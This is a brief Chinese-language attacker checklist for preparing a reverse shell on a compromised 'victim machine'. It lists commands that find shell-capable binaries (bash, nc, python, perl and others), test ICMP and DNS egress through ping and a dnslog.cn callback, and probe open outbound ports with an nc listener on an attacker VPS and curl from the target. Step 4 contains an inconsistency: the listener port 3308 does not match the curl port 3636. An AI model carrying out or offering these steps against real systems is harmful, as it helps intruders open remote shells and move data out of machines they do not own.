1、判断目标存在哪些反弹shell的命令


   受害机上执行：whereis bash nc exec telnet python php perl ruby java go gcc g++

2、判断目标机器能否通icmp流量

   1) ping -c 1 22.xxx.xxx.x >icmp.txt
   
   2) ls -alh
   
   3) cat icmp.txt
3、判断目标机器DNS能否出网

 法一：
  
   1）受害机上执行：ping -c 1 www.baidu.com>dns.txt
   
   2）受害机上执行：ls -alh
   
   3）受害机上执行：cat dns.txt

法二：

   1）反连平台dnslog.cn上生成一个子域名
   
   2）受害机上执行：ping xxx.dnslog.cn

   3）查看反连平台

4、判断目标机器向外开了哪些端口

   1) VPS:nc-v -n -lp 3308
   2) 目标机器：curl http://xx.xx.xx.xx:3636

   
